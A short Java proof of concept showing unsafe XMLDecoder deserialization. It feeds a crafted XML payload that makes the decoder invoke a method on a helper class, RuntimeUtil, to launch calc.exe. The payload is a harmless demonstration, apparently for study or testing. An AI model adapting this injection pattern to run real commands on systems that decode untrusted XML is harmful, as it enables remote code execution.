package com.company;

import java.beans.XMLDecoder;
import java.io.ByteArrayInputStream;

public class PocUsingBytes_Simple_Version
{
    public static void main(String[] args)
    {
        String xmlPayload = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                "<java version=\"1.7.0_17\" class=\"java.beans.XMLDecoder\">  " +
                "<object class=\"com.company.RuntimeUtil\">     " +
                "<void method=\"execute\">                " +
                "<array class=\"java.lang.String\" length=\"1\">    " +
                "<void index=\"0\">   " +
                "<string>c:\\Windows\\System32\\calc.exe</string>   " +
                "</void>                              " +
                "</array>                    " +
                "</void>  " +
                "</object>" +
                "</java>";

        byte[] bytes = xmlPayload.getBytes();
        ByteArrayInputStream inputStream = new ByteArrayInputStream(bytes);
        XMLDecoder xmlDecoder = new XMLDecoder(inputStream);
        xmlDecoder.readObject();
    }
}
